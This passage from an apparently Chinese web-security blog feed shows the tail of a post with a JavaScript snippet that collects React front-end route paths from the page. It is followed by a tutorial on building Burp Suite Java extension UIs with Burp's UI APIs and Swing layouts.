class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jsx"><span class="hljs-comment">// 广度优先算法</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">traverseObject</span>(<span class="hljs-params">obj, prefix = <span class="hljs-string">&#x27;&#x27;</span>, maxDepth = <span class="hljs-number">32</span></span>) &#123;<br>    <span class="hljs-keyword">let</span> pathes = [];<br>    <span class="hljs-keyword">let</span> queue = [&#123; obj, prefix, <span class="hljs-attr">depth</span>: <span class="hljs-number">0</span> &#125;];<br>    <span class="hljs-keyword">let</span> visited = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakSet</span>();<br><br>    <span class="hljs-keyword">while</span> (queue.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">let</span> &#123; obj, prefix, depth &#125; = queue.<span class="hljs-title function_">shift</span>();<br><br>        <span class="hljs-keyword">if</span> (depth &gt; maxDepth || visited.<span class="hljs-title function_">has</span>(obj)) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        visited.<span class="hljs-title function_">add</span>(obj);<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> prop <span class="hljs-keyword">in</span> obj) &#123;<br>            <span class="hljs-keyword">let</span> newPrefix = prefix.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span> ? prefix + <span class="hljs-string">&quot;.&quot;</span> + prop : prop;<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">if</span> ([<span class="hljs-string">&#x27;parent&#x27;</span>, <span class="hljs-string">&#x27;window&#x27;</span>, <span class="hljs-string">&#x27;top&#x27;</span>, <span class="hljs-string">&#x27;self&#x27;</span>, <span class="hljs-string">&#x27;parentNode&#x27;</span>, <span class="hljs-string">&#x27;parentElement&#x27;</span>, <span class="hljs-string">&#x27;ownerDocument&#x27;</span>, <span class="hljs-string">&#x27;ownerElement&#x27;</span>,<br>                    <span class="hljs-string">&#x27;previousElementSibling&#x27;</span>, <span class="hljs-string">&#x27;previousSibling&#x27;</span>, <span class="hljs-string">&#x27;offsetParent&#x27;</span>,<br>                    <span class="hljs-string">&#x27;_parentVnode&#x27;</span>, <span class="hljs-string">&#x27;$parent&#x27;</span>, <span class="hljs-string">&#x27;_renderProxy&#x27;</span>, <span class="hljs-comment">// vue</span><br>                    <span class="hljs-string">&#x27;return&#x27;</span>, <span class="hljs-string">&#x27;containerInfo&#x27;</span>, <span class="hljs-string">&#x27;_debugOwner&#x27;</span>, <span class="hljs-string">&#x27;_owner&#x27;</span> <span class="hljs-comment">// react</span><br>                ].<span class="hljs-title function_">includes</span>(prop)) &#123;<br>                    <span class="hljs-keyword">continue</span>;<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> obj[prop] === <span class="hljs-string">&#x27;object&#x27;</span> &amp;&amp; obj[prop] !== <span class="hljs-literal">null</span>) &#123;<br>                    queue.<span class="hljs-title function_">push</span>(&#123; <span class="hljs-attr">obj</span>: obj[prop], <span class="hljs-attr">prefix</span>: newPrefix, <span class="hljs-attr">depth</span>: depth + <span class="hljs-number">1</span> &#125;);<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> obj[prop] === <span class="hljs-string">&#x27;string&#x27;</span> &amp;&amp; obj[prop].<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-keyword">if</span> (obj[prop].<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot; &quot;</span>) === -<span class="hljs-number">1</span> &amp;&amp; (obj[prop].<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;/&quot;</span>) === <span class="hljs-number">0</span> || newPrefix.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;route&quot;</span>) !== -<span class="hljs-number">1</span> || newPrefix.<span class="hljs-title function_">indexOf</span>(<span class="hljs-string">&quot;path&quot;</span>) !== -<span class="hljs-number">1</span>)) &#123;<br>                        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(newPrefix + <span class="hljs-string">&quot;: &quot;</span> + obj[prop]);<br>                        pathes.<span class="hljs-title function_">push</span>(obj[prop]);<br>                    &#125;<br>                &#125;<br>            &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;访问 &#x27;</span> + newPrefix + <span class="hljs-string">&#x27; 时错误: &#x27;</span> + e);<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    pathes = pathes.<span class="hljs-title function_">filter</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">value, index, self</span>) &#123;<br>        <span class="hljs-keyword">return</span> self.<span class="hljs-title function_">indexOf</span>(value) === index;<br>      &#125;);<br>      <br>    <span class="hljs-keyword">return</span> pathes;<br>&#125;<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">table</span>(<span class="hljs-title function_">traverseObject</span>(<span class="hljs-variable language_">document</span>));<br><br></code></pre></div></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>react-router文档：<a href="https://reactrouter.com/en/main">https://reactrouter.com/en/main</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;提取React前端路由&quot;&gt;&lt;a href=&quot;#提取React前端路由&quot; class=&quot;headerlink&quot; title=&quot;提取React前端路由&quot;&gt;&lt;/a&gt;提取React前端路由&lt;/h1&gt;&lt;p&gt;写了个脚本，用于提取使用React和react-router模块编写</summary>
      
    
    
    
    
    <category term="Web安全" scheme="https://ovi3.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
    <category term="JavaScript" scheme="https://ovi3.github.io/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>Burpsuite Java插件开发 - UI篇</title>
    <link href="https://ovi3.github.io/2024/01/18/burpsuite-java-extension-ui/"/>
    <id>https://ovi3.github.io/2024/01/18/burpsuite-java-extension-ui/</id>
    <published>2024-01-17T16:06:02.000Z</published>
    <updated>2024-07-21T05:46:47.626Z</updated>
    
    <content type="html"><![CDATA[<p>对我来说，编写UI是件比较烦的事。要调布局、大小、边界、颜色之类的，调半天，界面看起来才好看点。有时还遇到组件缩成一团或字显示不全的bug，实在烦。</p><p>编写BP插件的UI，除了BurpSuite提供的几个UI API，其余的就是Java Swing知识了。</p><h2 id="BurpSuite提供的UI-API"><a href="#BurpSuite提供的UI-API" class="headerlink" title="BurpSuite提供的UI API"></a>BurpSuite提供的UI API</h2><h3 id="ITAB-和-IMessageEditor"><a href="#ITAB-和-IMessageEditor" class="headerlink" title="ITAB 和 IMessageEditor"></a>ITAB 和 IMessageEditor</h3><p>官方示例 <a href="https://github.com/PortSwigger/custom-logger/tree/master/java">CustomLogger</a> 插件，用于记录HTTP请求响应，点击对应项显示其请求包和响应包。 该插件用到了 <code>ITAB</code> 和 <code>IMessageEditor</code>这两个Burp提供的UI组件，其运行效果是：</p><p><img src="burpsuite-java-extension-ui-1.png" alt="burpsuite-java-extension-ui-1.png"></p><p>看下官方的示例代码，再自己运行一下插件，就可以知道这两个UI组件是做什么的。</p><ul><li><code>IMessageEditor</code>：通过调用<code>IBurpExtenderCallbacks</code>对象的<code>IMessageEditor createMessageEditor(IMessageEditorController controller, boolean editable)</code>方法来创建。一般创建两个<code>IMessageEditor</code>，一个用于显示请求包，一个显示响应包，跟BurpSuite Proxy面板提供的那样。<code>IMessageEditor</code>组件还需要跟<code>IMessageEditorController</code>类一起使用，该类用于返回要展示的HTTP请求和响应信息。</li><li><code>ITAB</code>：在burp顶栏多一项TAB，点击TAB标题显示自己设置的面板。通过调用 <code>IBurpExtenderCallbacks</code>对象的<code>void addSuiteTab(ITab tab)</code> 方法添加TAB。</li></ul><h3 id="IMessageEditorTab-和-ITextEditor"><a href="#IMessageEditorTab-和-ITextEditor" class="headerlink" title="IMessageEditorTab 和 ITextEditor"></a>IMessageEditorTab 和 ITextEditor</h3><p>官方示例 <a href="https://github.com/PortSwigger/example-custom-editor-tab/tree/master/java">CustomEditorTab</a> 插件，在<code>IMessageEditor</code>组件里添加一个TAB页，用于显示请求包里data参数值的base64解码结果。该插件用到了 <code>IMessageEditorTab</code> 和 <code>ITextEditor</code>。其运行效果是：</p><p><img src="burpsuite-java-extension-ui-2.png" alt="burpsuite-java-extension-ui-2.png"></p><ul><li><p><code>ITextEditor</code>：一个文本显示、编辑组件，比Java Swing内置的JTextArea文本框组件多了一些功能。支持搜索，显示行号。可通过<code>IBurpExtenderCallbacks</code>对象的<code>createTextEditor()</code>方法创建。</p></li><li><p><code>IMessageEditorTab</code>：在<code>IMessageEditor</code>组件里的TAB页。通过实现<code>IMessageEditorTabFactory</code>接口的<code>IMessageEditorTab createNewInstance(IMessageEditorController controller, boolean editable)</code>方法，该方法返回一个<code>IMessageEditorTab</code>对象，再通过调用<code>IBurpExtenderCallbacks</code>对象的<code>void registerMessageEditorTabFactory(IMessageEditorTabFactory factory)</code> 注册<code>IMessageEditorTabFactory</code>对象，就实现了在<code>IMessageEditor</code>组件里添加一个TAB页（这段话有点绕，看代码清晰些）。<code>IMessageEditorTab</code>接口的几个方法：</p><ul><li><p><code>void setMessage(byte[] content, boolean isRequest)</code>：在点击该TAB时调用。 content参数为原请求（Origin Request）或原响应（Origin Response）的完整数据。通常在这个方法里设置该TAB组件里的内容。</p></li><li><p><code>byte[] getMessage()</code>：返回值会覆盖原请求或响应内容。该方法里通常用于当用户修改了该TAB内的内容后，修改原请求或原响应的内容。</p></li><li><p><code>byte[] getSelectedData()</code>：返回当前用户所选择的数据，在该TAB里按Ctrl+C复制时调用；若返回null，则在该TAB按Ctrl + C复制的是整个包的内容。</p></li><li><p><code>boolean isModified()</code>：在点击该TAB后点击其它TAB时调用。返回true时，burp才会调用<code>byte[] getMessage()</code>方法。 若不想修改原请求或响应体的内容则返回false。</p></li><li><p><code>java.lang.String getTabCaption()</code>：返回TAB标题名</p></li><li><p><code>java.awt.Component getUiComponent()</code>：返回该TAB的UI组件</p></li><li><p><code>boolean isEnabled(byte[] content, boolean isRequest)</code>：是否显示该TAB。</p><p>Burp对<code>IMessageEditorTab</code>的几个方法的调用顺序是：</p></li></ul><ol><li>点击一个请求响应项显示<code>IMessageEditor</code>组件后，依次调用： <code>isEnabled -&gt; getUiComponent -&gt; getTabCaption</code>。 </li><li>再点击插件注册的TAB时，调用： <code>setMessage</code></li><li>再点到其他TAB时，依次调用：<code>isModified -&gt; getMessage</code></li></ol></li></ul><h3 id="IContextMenuFactory"><a href="#IContextMenuFactory" class="headerlink" title="IContextMenuFactory"></a>IContextMenuFactory</h3><p>使用<code>IContextMenuFactory</code>添加右键插件菜单。写了个示例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> burp;<br><br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BurpExtender</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IBurpExtender</span>, IContextMenuFactory<br>&#123;<br>    <span class="hljs-keyword">private</span> IBurpExtenderCallbacks callbacks;<br>    <span class="hljs-keyword">private</span> IExtensionHelpers helpers;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">registerExtenderCallbacks</span><span class="hljs-params">(IBurpExtenderCallbacks callbacks)</span><br>    &#123;<br>        <span class="hljs-comment">// keep a reference to our callbacks object</span><br>        <span class="hljs-built_in">this</span>.callbacks = callbacks;<br><br>        <span class="hljs-comment">// obtain an extension helpers object</span><br>        helpers = callbacks.getHelpers();<br><br>        <span class="hljs-comment">// set our extension name</span><br>        callbacks.setExtensionName(<span class="hljs-string">&quot;MenuTest&quot;</span>);<br><br>        callbacks.registerContextMenuFactory(BurpExtender.<span class="hljs-built_in">this</span>);<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> List&lt;JMenuItem&gt; <span class="hljs-title function_">createMenuItems</span><span class="hljs-params">(IContextMenuInvocation invocation)</span> &#123;<br>        List&lt;JMenuItem&gt; listMenuItems = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br><br>        <span class="hljs-type">JMenuItem</span> <span class="hljs-variable">menuItem</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JMenuItem</span>(<span class="hljs-string">&quot;Sent to MenuTest&quot;</span>);<br>        menuItem.addActionListener(e -&gt; &#123;<br>            IHttpRequestResponse[] reqs = invocation.getSelectedMessages();<br>            <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br>            sb.append(<span class="hljs-string">&quot;what we get:\n&quot;</span>);<br>            <span class="hljs-keyword">for</span> (IHttpRequestResponse req : reqs) &#123;<br>                sb.append(<span class="hljs-string">&quot; - &quot;</span>);<br>                sb.append(helpers.analyzeRequest(req).getMethod());<br>                sb.append(<span class="hljs-string">&quot; &quot;</span>);<br>                sb.append(helpers.analyzeRequest(req).getUrl());<br>                sb.append(<span class="hljs-string">&quot;\n&quot;</span>);<br>            &#125;<br>            callbacks.printOutput(sb.toString());<br>        &#125;);<br><br>        listMenuItems.add(menuItem);<br><br>        <span class="hljs-keyword">return</span> listMenuItems;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>运行效果：</p><p><img src="burpsuite-java-extension-ui-3.png" alt="burpsuite-java-extension-ui-3"></p><p>给Burp右键插件菜单添加了一项<code>Send to MenuTest</code>菜单。</p><p>关键是实现<code>IContextMenuFactory</code>接口的<code>List&lt;JMenuItem&gt; createMenuItems(IContextMenuInvocation invocation)</code>方法。每次在<code>Proxy</code>、<code>Repeater</code>、<code>Issue Activity</code>等面板点击鼠标右键的时候就会调用一次该方法。</p><p>可以通过调用<code>invocation</code>参数的<code>int getToolFlag()</code>方法获取<code>toolFlag</code>，判断用户在哪里右键的。如：</p><ul><li>在<code>Dashboard - Issue activiy</code>的<code>issue</code>列表右键，<code>toolFlag</code>值为 <code>IBurpExtenderCallbacks.TOOL_SUITE</code></li><li>在<code>Dashboard - Issue activiy</code>下方的<code>Request</code>和<code>Response</code>栏右键，则是<code>IBurpExtenderCallbacks.TOOL_SCANNER</code></li><li>在<code>Target - Contents</code>右键，是<code>IBurpExtenderCallbacks.TOOL_TARGET</code></li><li>在<code>Target - Issues</code>的<code>issue</code>列表和其下方的<code>Request</code>和<code>Response</code>栏右键，是 <code>IBurpExtenderCallbacks.TOOL_SCANNER</code>。</li><li><code>toolFlag</code>的可能值还有<code>IBurpExtenderCallbacks.TOOL_REPEATER</code>， <code>IBurpExtenderCallbacks.TOOL_PROXY</code>等，可自行翻API文档看下。</li></ul><p>也可以通过调用<code>invocation</code>参数的<code>byte getInvocationContext()</code>方法来判断用户在哪里右键的。</p><h2 id="UI辅助工具"><a href="#UI辅助工具" class="headerlink" title="UI辅助工具"></a>UI辅助工具</h2><p>使用UI辅助工具拖动组件绘制UI界面，项目编译时工具会将UI定义文件转为java代码。</p><p>由于编写Java主程序跟BP插件之间还有些不同，前者直接编译运行，后者是编译生成jar包后再通过BP去加载，加上辅助工具生成的代码不够灵活，所以开发时并没有使用这类辅助工具，只在前期学习Java Swing布局时尝试了下。</p><p>IDEA自带一个GUI Form工具。也有一个第三方的JFormDesigner插件，比GUI Form更强大，需要购买，或者30天的试用。</p><p>使用GUI Form工具将UI定义文件转为java代码：</p><ol><li>在IDEA新建一个UI定义文件，即<code>form</code>文件：<code>右键 -&gt; New -&gt; Swing UI Designer -&gt; GUI Form</code>，</li><li>修改IDEA配置：点击<code>File -&gt; Settings -&gt; Editor -&gt; GUI Designer</code>，选择<code>Java source code</code>（即将GUI Form编译为Java代码。默认是<code>Binary class files</code>，即编译为class字节码）。</li><li>点击<code>Build -&gt; Build Project</code>，在<code>form</code>文件所在的目录对应的<code>java</code>文件就能看到GUI Form生成的java代码。</li></ol><p>需要注意的是：</p><ol><li>GUI Form不支持BoxLayout、GroupLayout布局</li><li>HSpacer和VSpacer组件是IDEA提供的，不是swing库提供的。所以要写BP插件，还不好使用到这两个组件。</li></ol><p>即使辅助工具方便了UI编写，但有时将组件拖来拖去也弄不出想要的效果， 得了解一些布局的知识。</p><h2 id="Java-Swing-布局"><a href="#Java-Swing-布局" class="headerlink" title="Java Swing 布局"></a>Java Swing 布局</h2><p>官方文档： <a href="https://docs.oracle.com/javase/tutorial/uiswing/layout/index.html">https://docs.oracle.com/javase/tutorial/uiswing/layout/index.html</a> ， 官方提供的布局有8个，还可以实现自己的布局管理器。编写BP插件的UI，主要是展示数据页面和配置页面，常用的布局就三个：BorderLayout， BoxLayout，GridBagLayout。</p><h3 id="BorderLayout布局"><a href="#BorderLayout布局" class="headerlink" title="BorderLayout布局"></a><strong>BorderLayout布局</strong></h3><p>BorderLayout布局分为五个区域：上、下、左、右和中间。</p><ul><li><code>BorderLayout.NORTH</code></li><li><code>BorderLayout.SOUTH</code></li><li><code>BorderLayout.WEST</code></li><li><code>BorderLayout.EAST</code></li><li><code>BorderLayout.CENTER</code></li></ul><p>当窗口扩大时中间区域将尽可能获取更多空间，而其它区域只是占用它们需要的大小，当窗口缩小时，优先缩小的也是中间区域。一般用到该布局时，只用到中间区域（如：只放一个组件在中间区域，它尽可能占满窗口）或中间区域加上另一个区域（如：上区域放一个搜索框，中间区域放搜索结果； 中间区域放信息，下区域放“确定”，”取消“按钮）。</p><p>示例代码：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.blog;<br><br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> java.awt.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BorderLayoutDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        javax.swing.SwingUtilities.invokeLater(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Runnable</span>() &#123;<br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>                <span class="hljs-type">JFrame</span> <span class="hljs-variable">frame</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JFrame</span>(<span class="hljs-string">&quot;BorderLayoutDemo&quot;</span>);<br><br>                <span class="hljs-type">JPanel</span> <span class="hljs-variable">contentPane</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JPanel</span>();<br>                contentPane.setLayout(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BorderLayout</span>());<br><br>                <span class="hljs-type">JTextField</span> <span class="hljs-variable">textField</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JTextField</span>();<br>                textField.setPreferredSize(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Dimension</span>( textField.getPreferredSize().width, <span class="hljs-number">30</span>));<br>                textField.setBackground(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Color</span>(<span class="hljs-number">0xAA</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0xBB</span>));<br>                contentPane.add(textField, BorderLayout.NORTH);<br><br>                <span class="hljs-type">JTextArea</span> <span class="hljs-variable">textArea</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JTextArea</span>(<span class="hljs-number">20</span>, <span class="hljs-number">50</span>);<br>                textArea.setBackground(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Color</span>(<span class="hljs-number">0x80</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0xBD</span>));<br>                contentPane.add(textArea, BorderLayout.CENTER);<br><br>                frame.setContentPane(contentPane);<br>                frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);<br>                frame.pack();<br>                frame.setVisible(<span class="hljs-literal">true</span>);<br>            &#125;<br>        &#125;);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>效果：</p><p><img src="burpsuite-java-extension-ui-4.png" alt="burpsuite-java-extension-ui-4"></p><p>还有几点说明：</p><ol><li>若要设置四周几个块里组件的大小，不能使用<code>setMinimumSize</code>方法，要用<code>setPreferredSize</code>方法。</li><li>该布局没有提供设置每个区域之间间隔的方法。</li></ol><h3 id="BoxLayout布局"><a href="#BoxLayout布局" class="headerlink" title="BoxLayout布局"></a><strong>BoxLayout布局</strong></h3><p>BoxLayout布局是将组件沿着X轴（<code>BoxLayout.X_AXIS</code>）或Y轴（<code>BoxLayout.Y_AXIS</code>）放，可设置组件的对齐方式，如沿着Y轴放时，设置以组件的左侧或中轴线来对齐等。</p><p>通常想要组件沿着一个方向排列，只考虑一个方向上组件对齐，不考虑水平和垂直方法上都对齐时，则用BoxLayout。</p><p>示例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.blog;<br><br><span class="hljs-keyword">import</span> javax.swing.*;<br><span class="hljs-keyword">import</span> javax.swing.border.EmptyBorder;<br><span class="hljs-keyword">import</span> java.awt.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BoxLayoutDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        javax.swing.SwingUtilities.invokeLater(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Runnable</span>() &#123;<br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>                <span class="hljs-type">JFrame</span> <span class="hljs-variable">frame</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JFrame</span>(<span class="hljs-string">&quot;BoxLayoutDemo&quot;</span>);<br><br>                <span class="hljs-type">JPanel</span> <span class="hljs-variable">contentPane</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JPanel</span>();<br>                contentPane.setLayout(<span class="hljs-keyword">new</span> <span class="hljs-title class_">BoxLayout</span>(contentPane, BoxLayout.X_AXIS));<br>                contentPane.setBorder(<span class="hljs-keyword">new</span> <span class="hljs-title class_">EmptyBorder</span>(<span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>, <span class="hljs-number">5</span>));<br>                contentPane.add(Box.createHorizontalGlue());<br>                contentPane.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">JButton</span>(<span class="hljs-string">&quot;确认&quot;</span>));<br>                contentPane.add(Box.createHorizontalStrut(<span class="hljs-number">5</span>));<br>                contentPane.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">JButton</span>(<span class="hljs-string">&quot;取消&quot;</span>));<br><br>                contentPane.setPreferredSize(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Dimension</span>(<span class="hljs-number">560</span>, contentPane.getPreferredSize().height));<br>                frame.setContentPane(contentPane);<br>                frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);<br>                frame.pack();<br>                frame.setVisible(<span class="hljs-literal">true</span>);<br>            &#125;<br>        &#125;);<br>    &#125;<br><br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>效果：</p><p><img src="burpsuite-java-extension-ui-5.png" alt="burpsuite-java-extension-ui-5"></p><p>说明：</p><ol><li>BoxLayout布局里每个组件都是靠在一起的，如果要在组件之间有空隙，可以添加不可见组件（空白组件）：<ul><li>Rigid Area，固定大小的空白组件。<code>Box.createRigidArea(new Dimension(5,0))</code>。</li><li>Glue，伸展出去的空白组件。沿水平方向伸展：<code>Box.createHorizontalGlue()</code>，沿垂直方向伸展：<code>Box.createVerticalGlue()</code></li></ul></li><li>BoxLayout布局会考虑到组件的最小、期望、最大大小。通过调用组件的<code>setXxxSize</code>方法（这些方法定义在JComponnet类）来设置：<ul><li><code>comp.setMinimumSize(new Dimension(50, 25))</code>：设置最小大小</li><li><code>comp.setPreferredSize(new Dimension(50, 25))</code>：设置期望大小</li><li><code>comp.setMaximumSize(new Dimension(300, 300))</code>：设置最大大小，让组件大小不随着窗口放大而改变，或者不让它默认延展到最大</li></ul></li><li>Windows下，PowerToys工具的屏幕标尺可以测量宽高， snipaste截图工具也可以</li><li>设置布局里组件的对齐方式：通过调用各个组件的<code>setAlignmentX</code>方法和<code>setAlignmentY</code>方法来设置。</li></ol><h3 id="GridBagLayout布局"><a href="#GridBagLayout布局" class="headerlink" title="GridBagLayout布局"></a><strong>GridBagLayout布局</strong></h3><p>GridBagLayout布局将组件放在单元格里，每个组件占用一个或多个单元格，每一行可以是不同高度，每一列可以是不同宽度。</p><p>编写配置页面UI的时候通常用这个布局，代码：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 